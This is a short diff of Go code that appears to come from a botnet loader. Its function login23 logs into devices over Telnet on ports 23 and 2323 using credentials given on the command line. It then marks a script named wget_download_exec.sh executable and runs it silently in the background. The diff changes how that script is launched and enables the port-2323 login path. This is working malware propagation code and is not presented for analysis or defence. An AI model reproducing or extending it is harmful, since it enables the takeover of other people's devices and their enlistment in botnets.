@@ -62,7 +62,7 @@ func login23(usr string , psw string,ip string,port string){
 					//conn.Write([]byte("chmod +x loader"+"\n"))
 					conn.Write([]byte("chmod +x wget_download_exec.sh"+"\n"))
 					time.Sleep( 1 * time.Second)
-					conn.Write([]byte("nohup ./wget_download_exec.sh > /dev/null 2>&1 &"+"\n"))
+					conn.Write([]byte("./wget_download_exec.sh > /dev/null 2>&1 &"+"\n"))
 					time.Sleep( 1 * time.Second)
 					return
 				}
@@ -98,7 +98,7 @@ func main(){
 				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
 			case "2323":
 				//login23("admin","password","192.168.1.181","23")	
-				//login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
+				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
 			case "22":
 				//login22(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
 		}
